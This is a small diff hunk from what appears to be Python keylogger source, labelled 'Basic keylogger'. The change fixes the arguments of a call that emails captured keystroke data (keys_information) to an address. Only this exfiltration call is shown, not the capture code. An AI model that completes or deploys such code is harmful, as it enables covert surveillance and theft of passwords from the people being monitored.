@@ -67,7 +67,7 @@ def send_email(filename, attachment, toaddr):
     s.quit()
 
 
-send_email(keys_information, toaddr)
+send_email(keys_information, "test", toaddr)
 
 
 # ===================================================== Basic keylogger ================================================
